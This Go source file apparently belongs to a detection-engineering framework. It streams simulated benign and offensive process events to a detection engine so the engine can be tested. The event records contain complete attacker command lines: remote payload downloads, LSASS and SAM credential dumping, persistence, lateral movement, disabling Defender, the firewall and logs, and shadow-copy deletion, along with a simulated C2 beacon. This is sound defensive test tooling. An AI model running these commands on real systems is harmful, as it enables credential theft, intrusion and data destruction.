// Command devsensor generates simulated process events (some benign,
// some emulating well-known offensive TTPs) and streams them as NDJSON
// to the engine. It exists so the full pipeline can be exercised on
// any platform without ETW, exactly like the tracer bullet in the docs.
package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/Ruby570bocadito/security-framework/pkg/model"
)

// Ingest and detector exercise knobs; the scenario itself is fixed
// and deterministic so any consumer (smoke, E2E, bench) can assert on
// exact alert counts.
var (
	addr     = flag.String("addr", "127.0.0.1:7777", "engine address")
	interval = flag.Duration("interval", 400*time.Millisecond, "delay between events")
	token    = flag.String("token", "",
		"ingest token sent as 'AUTH <token>' (falls back to SF_INGEST_TOKEN); required when the engine starts with -token")
	tlsConn = flag.Bool("tls", false, "dial the engine over TLS (requires the engine started with -ingest-cert/-ingest-key)")
	caFile  = flag.String("ca", "",
		"CA certificate (PEM) used to verify the engine's TLS certificate; empty uses the system roots; requires -tls")
	beaconN     = flag.Int("beacon", 0, "after the scenario, emit N regular network.connect events (simulated C2 call-home for the beaconing detector)")
	beaconEvery = flag.Duration("beacon-interval", time.Second, "delay between beacon connections")
	burstN      = flag.Int("burst", 0, "after the scenario, emit N file.write events into C:\\Users\\Public (simulated mass staging for the threshold detector)")
	burstEvery  = flag.Duration("burst-interval", 20*time.Millisecond, "delay between burst writes")
)

var scenario = []*model.Event{
	benign(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 4104, PPID: 812, Name: "explorer.exe",
			Image: `C:\Windows\explorer.exe`},
	}),
	benign(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 4212, PPID: 4104, Name: "notepad.exe",
			CommandLine: `"C:\Windows\system32\NOTEPAD.EXE" C:\Users\jdoe\Documents\todo.txt`,
			Image:       `C:\Windows\System32\notepad.exe`},
	}),
	benign(&model.Event{
		Type: model.TypeNetworkConnect,
		Network: &model.Network{Protocol: "tcp", SourceIP: "10.0.4.42", SourcePort: 51520,
			DestinationIP: "142.250.200.36", DestinationPort: 443, Domain: "www.google.com"},
	}),
	// T1059.001 - PowerShell with encoded command (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6612, PPID: 4104, Name: "powershell.exe",
			CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
			Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
	}),
	// T1105 - certutil download (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6688, PPID: 4104, Name: "certutil.exe",
			CommandLine: "certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\\Users\\Public\\payload.exe",
			Image:       `C:\Windows\System32\certutil.exe`},
	}),
	// T1218.005 - remote MSI installation (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6801, PPID: 6612, Name: "msiexec.exe",
			CommandLine: "msiexec.exe /q /i http://185.220.101.47/payload.msi",
			Image:       `C:\Windows\System32\msiexec.exe`},
	}),
	// T1003.001 - LSASS dump via comsvcs.dll (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6721, PPID: 6612, Name: "rundll32.exe",
			CommandLine: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full`,
			Image:       `C:\Windows\System32\rundll32.exe`},
	}),
	// T1003.001 - LSASS dump via signed procdump (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6845, PPID: 6612, Name: "procdump.exe",
			CommandLine: `procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass2.dmp`,
			Image:       `C:\Windows\System32\procdump.exe`},
	}),
	// T1003.002 - SAM hive dump (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6834, PPID: 6612, Name: "reg.exe",
			CommandLine: `reg.exe save HKLM\SAM C:\Users\Public\sam.hiv`,
			Image:       `C:\Windows\System32\reg.exe`},
	}),
	// T1053.005 - scheduled task persistence (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6733, PPID: 6612, Name: "schtasks.exe",
			CommandLine: `schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\Users\Public\payload.exe"`,
			Image:       `C:\Windows\System32\schtasks.exe`},
	}),
	// T1547.001 - Run key persistence (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6777, PPID: 6612, Name: "reg.exe",
			CommandLine: `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /t REG_SZ /d C:\Users\Public\payload.exe /f`,
			Image:       `C:\Windows\System32\reg.exe`},
	}),
	// T1047 - WMI process execution (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6744, PPID: 6612, Name: "wmic.exe",
			CommandLine: `wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\Users\Public\payload.exe"`,
			Image:       `C:\Windows\System32\wbem\WMIC.exe`},
	}),
	// T1021.002 - lateral movement with PsExec (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6856, PPID: 6612, Name: "psexec.exe",
			CommandLine: `psexec.exe \\LAB-WKS-02 -accepteula -c C:\Users\Public\payload.exe`,
			Image:       `C:\Windows\System32\psexec.exe`},
	}),
	// T1562.001 - Defender tampering (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6755, PPID: 6612, Name: "powershell.exe",
			CommandLine: "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true",
			Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
	}),
	// T1562.004 - firewall impairment (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6812, PPID: 6612, Name: "netsh.exe",
			CommandLine: "netsh.exe advfirewall set allprofiles state off",
			Image:       `C:\Windows\System32\netsh.exe`},
	}),
	// T1070.001 - clear event logs (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6823, PPID: 6612, Name: "wevtutil.exe",
			CommandLine: "wevtutil.exe cl Security",
			Image:       `C:\Windows\System32\wevtutil.exe`},
	}),
	// T1218.010 - regsvr32 scriptlet execution (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6790, PPID: 6612, Name: "regsvr32.exe",
			CommandLine: "regsvr32.exe /u /i:http://185.220.101.47/scrobj.dll scrobj",
			Image:       `C:\Windows\System32\regsvr32.exe`},
	}),
	// T1490 - inhibit recovery, VSS deletion (offensive)
	offensive(&model.Event{
		Type: model.TypeProcessCreate,
		Process: &model.Process{PID: 6766, PPID: 6612, Name: "vssadmin.exe",
			CommandLine: "vssadmin.exe delete shadows /all /quiet",
			Image:       `C:\Windows\System32\vssadmin.exe`},
	}),
	benign(&model.Event{
		Type:    model.TypeProcessTerminate,
		Process: &model.Process{PID: 4212, Name: "notepad.exe"},
	}),
}

func main() {
	flag.Parse()

	conn, err := dialEngine()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[DEVSENSOR] cannot reach engine at %s: %v\n", *addr, err)
		fmt.Fprintln(os.Stderr, "[DEVSENSOR] hint: start the engine first:  sf-engine   (or simply  sf-console)")
		if *tlsConn {
			fmt.Fprintln(os.Stderr, "[DEVSENSOR] hint: for a TLS engine, check -tls is set and -ca points at the CA that signed the engine's -ingest-cert (certificate names must match the host you dial)")
		}
		os.Exit(1)
	}
	defer conn.Close()

	// AUTH handshake: must be the first line when the engine has a
	// token configured. The ack is read so a wrong token fails here
	// with a clear message instead of losing the whole scenario.
	sharedToken := *token
	if sharedToken == "" {
		sharedToken = os.Getenv("SF_INGEST_TOKEN")
	}
	if sharedToken != "" {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		if _, err := fmt.Fprintf(conn, "AUTH %s\n", sharedToken); err != nil {
			fmt.Fprintf(os.Stderr, "[DEVSENSOR] auth send: %v\n", err)
			os.Exit(1)
		}
		ack, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Fprintf(os.Stderr, "[DEVSENSOR] auth rejected (no ack from engine)\n")
			os.Exit(1)
		}
		if !strings.Contains(ack, `"ack":"ok"`) {
			fmt.Fprintf(os.Stderr, "[DEVSENSOR] auth rejected by engine: %s", ack)
			os.Exit(1)
		}
		conn.SetDeadline(time.Time{})
		fmt.Println("[DEVSENSOR] ingest auth accepted")
	}

	fmt.Printf("[DEVSENSOR] connected to %s - streaming %d events\n", *addr, len(scenario))
	fmt.Println("[DEVSENSOR] NOTE: this is the SIMULATED demo scenario - not your host. Real telemetry: sf-sensor")
	for i, ev := range scenario {
		line, err := ev.Encode()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[DEVSENSOR] encode: %v\n", err)
			os.Exit(1)
		}
		if _, err := conn.Write(append(line, '\n')); err != nil {
			fmt.Fprintf(os.Stderr, "[DEVSENSOR] send: %v\n", err)
			os.Exit(1)
		}
		marker := "benign"
		for _, t := range ev.Tags {
			if t == "ttp:offensive" {
				marker = "OFFENSIVE"
			}
		}
		fmt.Printf("[DEVSENSOR] %2d/%d %-9s %-18s %s\n",
			i+1, len(scenario), marker, ev.Type, describe(ev))
		time.Sleep(*interval)
	}
	// Simulated C2 call-home (A3): the implant from the scenario
	// (powershell.exe PID 6612) phones home to the offensive C2 IP at
	// a regular cadence. Feeds the engine's beaconing detector in E2E
	// runs; 0 by default so every existing scenario stays byte-identical.
	if *beaconN > 0 {
		fmt.Printf("[DEVSENSOR] beacon mode: %d connections to 185.220.101.47:443 every %s\n", *beaconN, *beaconEvery)
		for i := 0; i < *beaconN; i++ {
			ev := offensive(&model.Event{
				Type:    model.TypeNetworkConnect,
				Process: &model.Process{PID: 6612, Name: "powershell.exe"},
				Network: &model.Network{Protocol: "tcp", SourceIP: "10.0.4.42",
					SourcePort: 51000 + i%1000, DestinationIP: "185.220.101.47", DestinationPort: 443},
			})
			bline, err := ev.Encode()
			if err != nil {
				fmt.Fprintf(os.Stderr, "[DEVSENSOR] encode beacon: %v\n", err)
				os.Exit(1)
			}
			if _, err := conn.Write(append(bline, '\n')); err != nil {
				fmt.Fprintf(os.Stderr, "[DEVSENSOR] send beacon: %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("[DEVSENSOR] beacon %2d/%d (OFFENSIVE, simulated)\n", i+1, *beaconN)
			if i < *beaconN-1 {
				time.Sleep(*beaconEvery)
			}
		}
	}

	// Simulated mass staging (A2): a burst of file writes into the
	// public folder. Feeds the engine's threshold detector in E2E
	// runs; 0 by default so every existing scenario stays byte-identical.
	if *burstN > 0 {
		fmt.Printf("[DEVSENSOR] burst mode: %d file.write events into C:\\Users\\Public every %s\n", *burstN, *burstEvery)
		for i := 0; i < *burstN; i++ {
			ev := offensive(&model.Event{
				Type:    model.TypeFileWrite,
				Process: &model.Process{PID: 6612, Name: "powershell.exe"},
				File:    &model.File{Path: fmt.Sprintf("C:\\Users\\Public\\stage_%03d.dll", i)},
			})
			bline, err := ev.Encode()
			if err != nil {
				fmt.Fprintf(os.Stderr, "[DEVSENSOR] encode burst: %v\n", err)
				os.Exit(1)
			}
			if _, err := conn.Write(append(bline, '\n')); err != nil {
				fmt.Fprintf(os.Stderr, "[DEVSENSOR] send burst: %v\n", err)
				os.Exit(1)
			}
			if (i+1)%10 == 0 || i == *burstN-1 {
				fmt.Printf("[DEVSENSOR] burst %d/%d (OFFENSIVE, simulated)\n", i+1, *burstN)
			}
		}
	}

	fmt.Println("[DEVSENSOR] scenario complete - connection closed")
}

// dialEngine opens the connection to the engine: plain TCP by
// default, TLS when -tls is set. The -ca file pins the CA used to
// verify the engine's certificate (self-signed lab deployments pass
// their own CA; production deployments can use a system-trusted one
// by leaving -ca empty). There is deliberately no skip-verification
// mode: an encrypted channel to an unauthenticated endpoint would
// protect the feed from nobody.
func dialEngine() (net.Conn, error) {
	if !*tlsConn {
		return net.Dial("tcp", *addr)
	}
	cfg := &tls.Config{MinVersion: tls.VersionTLS12}
	if *caFile != "" {
		pem, err := os.ReadFile(*caFile)
		if err != nil {
			return nil, fmt.Errorf("read -ca: %w", err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(pem) {
			return nil, fmt.Errorf("-ca %s contains no usable certificate", *caFile)
		}
		cfg.RootCAs = pool
	}
	return tls.Dial("tcp", *addr, cfg)
}

func describe(ev *model.Event) string {
	if ev.Process != nil {
		return ev.Process.Name
	}
	if ev.Network != nil {
		return ev.Network.Domain
	}
	return "-"
}

func benign(ev *model.Event) *model.Event {
	ev.ID = newUUID()
	ev.Timestamp = time.Now().UTC()
	ev.Source = "simulate"
	ev.Host = "LAB-WKS-01"
	ev.User = `CORP\jdoe`
	return ev
}

func offensive(ev *model.Event) *model.Event {
	ev = benign(ev)
	ev.Tags = append(ev.Tags, "ttp:offensive")
	return ev
}

// newUUID returns a RFC 4122 v4 UUID without external dependencies.
func newUUID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
